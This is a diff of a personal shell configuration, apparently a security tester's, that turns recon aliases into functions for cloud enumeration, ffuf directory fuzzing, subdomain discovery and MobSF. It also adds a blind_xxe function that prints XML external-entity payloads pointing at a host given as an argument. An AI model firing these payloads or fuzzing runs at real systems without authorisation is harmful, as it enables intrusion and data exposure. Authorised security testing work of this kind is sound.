@@ -27,17 +27,38 @@ alias xclip="xclip -sel clip"
 alias nmap="grc nmap"
 alias pip="/usr/bin/pip"
 alias pip2="/usr/bin/pip2"
-alias ccat="pygmentize -g -O style=colorful,linenos=1"
-alias wordlists="tools/SecLists/"
 alias myip="curl http://ipecho.net/plain"
-alias cloudenum="python /home/arbenn/tools/cloud_enum/cloud_enum.py -k $1 >> $1.txt"
-alias wbu="waybackurls"
 alias smbmap="python2 /usr/bin/smbmap"
 alias ipaddr="ifconfig wlp1s0 | grep -w inet | awk '{print \$2}'"
 alias cyclic="python2 /usr/bin/cyclic"
-alias run-oneforall="docker run -it --rm -v ~/tools/oneforall/results:/OneForAll/results shmilylty/oneforall"
-alias fufi="ffuf -c -w ~/tools/SecLists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403,500,405 -e '/',.php,.txt,.db,.php.bak,.html,.zip -recursion -recursion-depth 2 -maxtime-job 300 -u "
 alias cat="bat --style=grid"
+
+run_cloudenum() {
+    python /home/arbenn/tools/cloud_enum/cloud_enum.py -k $1 >> $1.txt
+}
+
+run_ffuf() {
+    ffuf -c -w ~/tools/SecLists/Discovery/Web-Content/$1 -mc 200,204,301,302,307,401,403,500,405 -e .db,.html,.zip -recursion -recursion-depth 2 -maxtime-job 300 -u $2FUZZ
+}
+
+run_oneforall() {
+    docker run -it --rm -v ~/tools/oneforall/results:/OneForAll/results shmilylty/oneforall --target $1 --alive False run
+}
+
+run_mobsf() {
+    docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
+}
+
+github_subdomains() {
+    python /home/arbenn/tools/github-search/github-subdomains.py -t """[TOKEN]""" -d $1
+}
+
+blind_xxe() {
+    echo '<!DOCTYPE root [<!ENTITY test SYSTEM "http://'$1'">]><root>&test;</root>'
+    echo " "
+    echo '<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY % ext SYSTEM "http://'$1'"> %ext; ]><r></r>'
+}
+
 
 cwd_to_urxvt() {
     local update="\0033]777;cwd-spawn;path;$PWD\0007"
